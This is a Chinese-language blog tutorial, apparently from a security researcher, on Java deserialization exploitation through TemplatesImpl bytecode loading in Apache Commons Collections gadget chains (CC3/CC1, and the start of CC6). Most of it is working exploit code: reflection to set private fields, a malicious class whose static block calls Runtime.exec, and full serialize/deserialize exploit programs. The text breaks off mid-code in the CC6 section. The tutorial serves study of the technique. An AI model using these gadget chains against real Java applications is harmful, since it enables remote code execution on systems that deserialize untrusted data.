+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">    TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">    templates.newTransformer();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>追踪代码查看其限制。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">    _indentNumber, _tfactory);</span><br></pre></td></tr></table></figure></div>
+<p>追踪getTransletInstance<br>
+<img src="/imgss/java134.png" alt=""></p>
+<p>两个判断：<br>
+1、如果_name 为 null，则返回null，后续不再执行，也就无法调用newInstance() 实例化。<br>
+2、我们需要让 <code>_classs</code> 的值为空，才能进入调用 defineTransletClasses()。</p>
+<p>然后才能进入newInstance方法。</p>
+<p>跟进defineTransletClasses()，<code>_bytecodes</code>不能为null。<br>
+tfactory是个方法，所以也不能为null。</p>
+<p><img src="/imgss/java135.png" alt=""></p>
+<h4 id="jie-jue-if" id="解决if">解决if</h4>
+<p>因为TemplatesImpl类是public，并且继承了Serializable。所以我们直接反射调用即可。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String _name = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure></div>
+<p>name 的值，这里需要的是 String，所以我们简单赋个 String 即可。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">Class aClass = templates.getClass();</span><br><span class="line">Field nameField = aClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+<p>class 的值应当为 null，我们去看 TemplatesImpl 的构造方法中没有给 class 赋初值，所以不用管它。</p>
+<p>然后我们看bytecodes：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[][] _bytecodes = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Class <span class="title">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="keyword">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>bytecodes 的值，这里需要的是一个二维数组，所以我们创建一个二维数组。但是 bytecodes 作为传递进 defineClass 方法的值是一个一维数组。而这个一维数组里面我们需要存放恶意的字节码。这一段伪代码可以这样写。</p>
+<p>简单来说：把一个一维数据封装到二维数组中。<br>
+创建恶意类并编译：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Calc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>javac Calc.java</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\code\\CCTest\\src\\main\\java\\Calc.class&quot;</span>));</span><br><span class="line"><span class="keyword">byte</span>[][] codes = &#123;evil&#125;;</span><br></pre></td></tr></table></figure></div>
+<p>所以这部分的代码为：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Field bytecodesField = aClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\code\\CCTest\\src\\main\\java\\Calc.class&quot;</span>));</span><br><span class="line"><span class="keyword">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">bytecodesField.set(templates,codes);</span><br></pre></td></tr></table></figure></div>
+<p>接下来看tfactory</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> TransformerFactoryImpl _tfactory = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure></div>
+<p>tfactory的关键字是transient，赋值无意义，这就意味着序列化之后无法被访问。<br>
+直接修改是不行的，但是我们这里的利用要求比较低，只要让 tfactory 不为 null 即可，我们去看一看 tfactory 的其他定义如何。</p>
+<p><img src="/imgss/java139.png" alt=""></p>
+<p>既然在defineTransletClasses中去调用了tfactory getExternalExtensionsMap方法，而且还是transient，所以直接从readobject中去找他。</p>
+<p>在 readObject() 方法中，找到了 tfactory 的初始化定义。</p>
+<p><img src="/imgss/java140.png" alt=""></p>
+<p>这时tfactory 不为null，所以直接在反射中为其赋值为 TransformerFactortImpl 即可，伪代码如下：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field tfactoryField = aClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">tfactoryField.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br></pre></td></tr></table></figure></div>
+<p>预期exp：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">Class aClass = templates.getClass();</span><br><span class="line"></span><br><span class="line">Field nameField = aClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">nameField.set(templates,<span class="string">&quot;zer0&quot;</span>);</span><br><span class="line"></span><br><span class="line">Field bytecodesField = aClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\code\\CCTest\\src\\main\\java\\Calc.class&quot;</span>));</span><br><span class="line"><span class="keyword">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">Field tfactoryField = aClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">tfactoryField.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">templates.newTransformer();</span><br></pre></td></tr></table></figure></div>
+<p>报错解决：<br>
+<img src="/imgss/java141.png" alt=""></p>
+<p>上图为空指针报错，我们去看第一行报错，在TemplatesImpl类的defineTransletClasses</p>
+<p>在393行，<code>if (_bytecodes == null) &#123;</code>打断点进行调试。</p>
+<p>最终在422行，发现<code>_auxClasses</code>报错NullPointerException，他的值为null。</p>
+<p><img src="/imgss/java142.png" alt=""></p>
+<p>此时两种方法：<br>
+1、让他equals符合判断，直接走到下一个<code>if (_transletIndex &lt; 0)</code>，不进else。<br>
+2、给<code>_auxClasses</code>赋值，使其不为null。</p>
+<p>但是我们发现即使给auxClasses赋值，transletIndex的值为-1，还是会跳出程序。</p>
+<p>所以我们采用第一种方法。</p>
+<p>看418行代码，判断defineClass传入的父类(这里为TemplatesImpl TransletClassLoader它的父类为java.lang.object)名称，是否继承了ABSTRACT_TRANSLET这个父类。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String ABSTRACT_TRANSLET</span><br><span class="line">    = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br></pre></td></tr></table></figure></div>
+<p>也就是说，我们执行恶意代码的类，需要继承AbstractTranslet。<br>
+<img src="/imgss/java143.png" alt=""></p>
+<p>解决报错：<br>
+跟一下AbstractTranslet类。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Translet</span> </span>&#123;</span><br></pre></td></tr></table></figure></div>
+<p>他是一个abstract抽象类，所以我们要实现他的抽象方法。<br>
+搜索abstract，发现方法transform(610行)。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator,</span></span></span><br><span class="line"><span class="function"><span class="params">                               SerializationHandler handler)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransletException</span>;</span><br></pre></td></tr></table></figure></div>
+<p>实现该方法。<br>
+<img src="/imgss/java144.png" alt=""></p>
+<p><img src="/imgss/java145.png" alt=""></p>
+<p>编译，把编译好的target\classes\calc.class放到我们之前指定的目录中。</p>
+<blockquote>
+<p>F:\code\CCTest\src\main\java\Calc.class</p>
+</blockquote>
+<p>再次运行exp</p>
+<p><img src="/imgss/java146.png" alt=""></p>
+<h3 id="cc-1-lian-de-templates-impl-de-shi-xian-fang-shi" id="CC1-链的-TemplatesImpl-的实现方式">CC1 链的 TemplatesImpl 的实现方式</h3>
+<p>TemplatesImpl 只是将原本的命令执行变成代码执行的方式所以在不考虑黑名单的情况下，如果可以进行命令执行，则一定可以通过动态加载字节码进行代码执行。</p>
+<p>前面的链子不变，只是最后执行runtime的方法变了。<br>
+<img src="/imgss/java147.png" alt=""></p>
+<p>构造暂时的exp</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">Class aClass = templates.getClass();</span><br><span class="line"></span><br><span class="line">Field nameField = aClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">nameField.set(templates,<span class="string">&quot;zer0&quot;</span>);</span><br><span class="line"></span><br><span class="line">Field bytecodesField = aClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\code\\CCTest\\src\\main\\java\\Calc.class&quot;</span>));</span><br><span class="line"><span class="keyword">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">Field tfactoryField = aClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">tfactoryField.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line"><span class="comment">//templates.newTransformer();</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(templates),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">null</span>,<span class="keyword">null</span>)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">chainedTransformer.transform(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/java148.png" alt=""></p>
+<p>最后一句，传入 chainedTransformer.transform(1) 是因为前面我们定义了 new ConstantTransformer(templates)，这个类是需要我们传参的，传入 1 即可。</p>
+<p>也就是说这里也能这样加载</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line"><span class="comment">//                new ConstantTransformer(templates),</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">null</span>,<span class="keyword">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        chainedTransformer.transform(templates);</span><br></pre></td></tr></table></figure></div>
+<p>完整exp</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC3Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException </span>&#123;</span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class aClass = templates.getClass();</span><br><span class="line"></span><br><span class="line">        Field nameField = aClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;zer0&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field bytecodesField = aClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\code\\CCTest\\src\\main\\java\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactoryField = aClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//templates.newTransformer();</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(templates),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">null</span>,<span class="keyword">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(templates);</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        Map decorateMap = LazyMap.decorate(objectObjectHashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; annotClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; AnnotationdeclaredConstructor = annotClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        AnnotationdeclaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler h = (InvocationHandler) AnnotationdeclaredConstructor.newInstance(Override.class, decorateMap);</span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map.class&#125;, h);</span><br><span class="line"></span><br><span class="line">        Object o = AnnotationdeclaredConstructor.newInstance(Override.class, mapProxy);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line">        unserialization(<span class="string">&quot;./2.ser&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream out_obj1 = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./2.ser&quot;</span>));</span><br><span class="line">        out_obj1.writeObject(obj);</span><br><span class="line">        out_obj1.close();</span><br><span class="line"><span class="comment">//        System.out.println(obj);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span>  Object <span class="title">unserialization</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream obj2 = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object ois = obj2.readObject();</span><br><span class="line">        <span class="keyword">return</span> ois;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/java149.png" alt=""></p>
+<h3 id="cc-6-lian-de-templates-impl-de-shi-xian-fang-shi" id="CC6-链的-TemplatesImpl-的实现方式">CC6 链的 TemplatesImpl 的实现方式</h3>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span 